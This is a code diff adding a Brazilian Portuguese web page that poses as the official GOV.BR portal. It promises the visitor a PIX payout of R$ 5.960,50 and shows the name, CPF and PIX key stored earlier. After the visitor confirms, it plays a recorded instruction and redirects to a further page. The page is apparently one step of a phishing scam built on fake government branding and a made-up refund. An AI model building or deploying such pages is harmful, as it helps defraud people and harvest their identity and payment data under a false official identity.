@@ -1,0 +1,216 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Consulta - Confirmação</title>
+
+  <!-- Tailwind -->
+  <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4" defer></script>
+
+  <!-- Fonte -->
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet" />
+   
+  <!-- UTM Fix -->
+  <script>
+    (function() {
+      try {
+        if (location.search && location.search.length > 1) {
+          sessionStorage.setItem("utm_final_qs", location.search);
+        }
+        if (!location.search || location.search.length <= 1) {
+          const saved =
+            sessionStorage.getItem("utm_final_qs") ||
+            sessionStorage.getItem("landing_qs") ||
+            (function() {
+              try {
+                return new URL(document.referrer).search || "";
+              } catch (e) {
+                return "";
+              }
+            })() ||
+            "";
+          if (saved) {
+            const cur = new URLSearchParams(location.search);
+            const add = new URLSearchParams(saved);
+            add.forEach((v, k) => {
+              if (!cur.has(k)) cur.set(k, v);
+            });
+            if (cur.toString()) {
+              history.replaceState(null, "", location.pathname + "?" + cur.toString() + location.hash);
+            }
+          }
+        }
+      } catch (e) {
+        console.warn("[UTM] Erro ao processar parâmetros:", e);
+      }
+    })();
+  </script>
+
+  <style>
+    body {
+      font-family: 'Poppins', sans-serif;
+    }
+  </style>
+</head>
+
+<body class="bg-gradient-to-br from-slate-50 via-blue-50 to-indigo-50">
+  <header class="fixed top-0 left-0 right-0 z-50 bg-white/90 backdrop-blur border-b border-gray-200 shadow-sm">
+    <div class="px-4 py-2 flex justify-between items-center">
+      <div class="flex items-center space-x-3">
+        <img src="imagens/Gov-br-logo-svg.png" alt="Logo GOV.BR" class="h-6 w-auto">
+        <div class="hidden sm:block h-5 w-px bg-gray-300"></div>
+        <span class="hidden sm:inline text-xs text-gray-600 font-medium">Portal Oficial</span>
+      </div>
+      <button class="flex items-center space-x-2 bg-blue-600 hover:bg-blue-700 text-white px-3 py-1.5 rounded-full text-sm">
+        <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
+          <path fill-rule="evenodd"
+            d="M10 9a3 3 0 100-6 3 3 0 000 6zm-7 9a7 7 0 1114 0H3z" clip-rule="evenodd"></path>
+        </svg>
+        <span id="nameHeader" class="font-medium"></span>
+      </button>
+    </div>
+  </header>
+
+  <main class="pt-20 pb-10 px-4">
+    <!-- STEP 1 -->
+    <section id="step1" class="max-w-md mx-auto">
+      <div class="bg-white rounded-2xl shadow-lg border border-gray-100 overflow-hidden">
+        <div class="bg-blue-600 text-white text-center p-4 font-semibold">Confirme seus Dados</div>
+        <div class="p-6 space-y-4">
+          <div class="text-center">
+            <h2 class="text-xl font-bold mb-2 text-gray-900">Verifique as informações</h2>
+            <p class="text-sm text-gray-600">Confirme se os dados estão corretos antes de continuar.</p>
+          </div>
+
+          <div class="bg-gradient-to-r from-green-50 to-green-100 border border-green-200 rounded-xl p-4 text-center">
+            <h3 class="font-bold text-green-800 mb-2">Valor a Receber</h3>
+            <p class="text-3xl font-bold text-green-600 mb-1">R$ 5.960,50</p>
+            <p class="text-sm text-green-700">Via transferência PIX</p>
+          </div>
+
+          <div class="bg-blue-50 rounded-xl p-4">
+            <div class="flex justify-between text-sm">
+              <span class="text-blue-700">Nome:</span>
+              <span id="nameUser10" class="text-blue-900 font-medium"></span>
+            </div>
+            <div class="flex justify-between text-sm">
+              <span class="text-blue-700">CPF:</span>
+              <span id="cpfUser10" class="text-blue-900 font-medium"></span>
+            </div>
+          </div>
+
+          <div class="bg-purple-50 border border-purple-200 rounded-xl p-4">
+            <h3 class="font-semibold text-purple-900 mb-2">🔑 Chave PIX</h3>
+            <div class="bg-white border border-purple-200 rounded p-2">
+              <p id="chavePix10" class="font-mono text-gray-800 break-all"></p>
+            </div>
+          </div>
+
+          <div class="space-y-3">
+            <button onclick="step1to2()"
+              class="w-full bg-green-600 hover:bg-green-700 text-white font-bold py-3 rounded-xl shadow-md transition">
+              SIM, OS DADOS ESTÃO CORRETOS
+            </button>
+            <a href="../processamento/"
+              class="w-full block text-center bg-amber-100 hover:bg-amber-200 text-amber-800 font-semibold py-3 rounded-xl">
+              CORRIGIR CHAVE PIX
+            </a>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- STEP 2 -->
+    <section id="step2" class="max-w-md mx-auto hidden">
+      <div class="bg-white rounded-2xl shadow-lg border border-gray-100 overflow-hidden">
+        <div class="bg-green-600 text-white text-center p-4 font-semibold">Chave PIX Cadastrada!</div>
+        <div class="p-6 text-center space-y-6">
+          <div class="bg-green-50 border border-green-200 rounded-xl p-4">
+            <h3 class="font-bold text-green-800 mb-2">Dados Confirmados</h3>
+            <p id="nameUser11" class="text-green-900 font-semibold"></p>
+            <p id="chavePix11" class="font-mono text-green-900 text-xs"></p>
+          </div>
+          <button onclick="step2to3()"
+            class="w-full bg-green-600 hover:bg-green-700 text-white font-bold py-3 rounded-xl shadow-md transition">
+            CONTINUAR
+          </button>
+        </div>
+      </div>
+    </section>
+
+    <!-- STEP 3 -->
+    <section id="step3" class="max-w-md mx-auto hidden">
+      <div class="bg-white rounded-2xl shadow-lg border border-gray-100 overflow-hidden">
+        <div class="bg-blue-600 text-white text-center p-4 font-semibold">Informações Finais</div>
+        <div class="p-6 text-center">
+          <p class="text-gray-600 mb-4">Reproduzindo instruções sobre o próximo passo...</p>
+          <audio id="audio2" src="audio2.mp3"></audio>
+          <div class="bg-gray-200 rounded-full h-2 mb-3">
+            <div id="progress-bar-audio2" class="bg-blue-500 h-2 rounded-full transition-all duration-300"
+              style="width: 0%"></div>
+          </div>
+          <p class="text-sm text-gray-500"><span id="actualTime2">00:00</span> / 0:19</p>
+        </div>
+      </div>
+    </section>
+  </main>
+
+  <script>
+    const name = localStorage.getItem('name') || '';
+    const cpf = localStorage.getItem('cpf') || '';
+    const chavePix = localStorage.getItem('chavePix') || '';
+
+    document.getElementById('nameHeader').textContent = name.split(' ')[0] || '';
+    document.getElementById('nameUser10').textContent = name;
+    document.getElementById('cpfUser10').textContent = cpf;
+    document.getElementById('chavePix10').textContent = chavePix;
+    document.getElementById('nameUser11').textContent = name;
+    document.getElementById('chavePix11').textContent = chavePix;
+
+    function step1to2() {
+      document.getElementById('step1').classList.add('hidden');
+      document.getElementById('step2').classList.remove('hidden');
+    }
+
+    function step2to3() {
+      document.getElementById('step2').classList.add('hidden');
+      document.getElementById('step3').classList.remove('hidden');
+      progressAudio2();
+    }
+
+    function progressAudio2() {
+      const audio = document.getElementById('audio2');
+      audio.play();
+      const bar = document.getElementById('progress-bar-audio2');
+      const timer = document.getElementById('actualTime2');
+      let progress = 0;
+      let seconds = 0;
+      const interval = setInterval(() => {
+        progress += 100 / (19000 / 100);
+        if (progress >= 100) {
+          progress = 100;
+          clearInterval(interval);
+          setTimeout(() => location.href = 'finalizacao.php', 1000);
+        }
+        bar.style.width = `${progress}%`;
+      }, 100);
+
+      const timeInterval = setInterval(() => {
+        seconds++;
+        if (seconds > 19) {
+          clearInterval(timeInterval);
+        } else {
+          const m = Math.floor(seconds / 60);
+          const s = seconds % 60;
+          timer.textContent = `${m}:${String(s).padStart(2, '0')}`;
+        }
+      }, 1000);
+    }
+  </script>
+</body>
+
+</html>
